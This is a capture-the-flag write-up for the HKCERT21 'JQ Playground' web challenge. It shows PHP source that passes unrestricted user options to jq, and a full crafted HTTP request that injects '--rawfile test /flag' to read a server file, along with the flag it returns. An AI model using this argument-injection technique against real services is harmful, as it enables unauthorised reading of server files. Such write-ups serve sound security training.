# JQ Playground (200 point, 15 solves, ★★☆☆☆)

Solved by: Kaiziron

### Description :
```
I wrote a simple testbed for the JSON processor jq!

The flag is written in the file /flag.

http://chalp.hkcert21.pwnable.hk:28370/
```
---
### Solution :

The website http://chalp.hkcert21.pwnable.hk:28370/ : 

![](https://i.imgur.com/cAVBtnW.png)

It is a web interface to run `jq`, and it will return the output of `jq` to us.

The source code of the page is given : 
http://chalp.hkcert21.pwnable.hk:28370/?-s

```php
<?php
if (isset($_GET["-s"])) {
    highlight_file(__FILE__);
    exit();
}
if (!empty($_POST)) {
  if (empty($_POST['filter']) || empty($_POST['json'])) {
    die("Filter or JSON is empty");
  }

  $filter = escapeshellarg($_POST['filter']);
  $json = escapeshellarg($_POST['json']);
  
  $options = "";

  if (!empty($_POST['options']) && is_array($_POST['options'])) {
    foreach ($_POST['options'] as $o) {
      $options .= escapeshellarg($o) . ' ';
    }
  }

  $command = "jq $options $filter";
  passthru("echo $json | $command");

  die();
}

?>
...
```
It is taking the options post parameter as array for the command line argument for `jq`

The website has switch for us to enable some argument :

![](https://i.imgur.com/8YeXwre.png)

Although it has only 5 options for us to choose, we are not limited to those 5 options as it will add the data we specified in options[] post parameter to the command variable and execute

By reading the documentation :
https://stedolan.github.io/jq/manual/

![](https://i.imgur.com/sDc7XKh.png)

I found that the --rawfile option can be used to read a file to a variable

The description shows the flag is in `/flag`, I will read the /flag to the `$test` variable :
```
--rawfile test /flag
```
Then set the filter to overwrite `name` to the content of `/flag` using the `$test` variable :
```
.name = $test
```
Then I just intercept a normal post request using burp suite and modify the parameter to what I want :

```
POST /? HTTP/1.1
Host: chalp.hkcert21.pwnable.hk:28370
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------317966628944816405675537310
Content-Length: 689
Origin: http://chalp.hkcert21.pwnable.hk:28370
Connection: close
Referer: http://chalp.hkcert21.pwnable.hk:28370/

-----------------------------317966628944816405675537310
Content-Disposition: form-data; name="filter"

.name = $test
-----------------------------317966628944816405675537310	
Content-Disposition: form-data; name="json"

{
"name": "John",
"age": 30,
"car": null
}
-----------------------------317966628944816405675537310
Content-Disposition: form-data; name="options[]"

--rawfile
-----------------------------317966628944816405675537310
Content-Disposition: form-data; name="options[]"

test
-----------------------------317966628944816405675537310
Content-Disposition: form-data; name="options[]"

/flag
-----------------------------317966628944816405675537310--
```

Then the flag is received :
```
HTTP/1.1 200 OK
Date: Sun, 14 Nov 2021 14:20:03 GMT
Server: Apache/2.4.51 (Debian)
X-Powered-By: PHP/8.0.12
Vary: Accept-Encoding
Content-Length: 83
Connection: close
Content-Type: text/html; charset=UTF-8

{
  "name": "hkcert21{y0u\\are\\n0w\\jq\\expert!}\n",
  "age": 30,
  "car": null
}

```
### Flag :
`hkcert21{y0u\are\n0w\jq\expert!}`

---
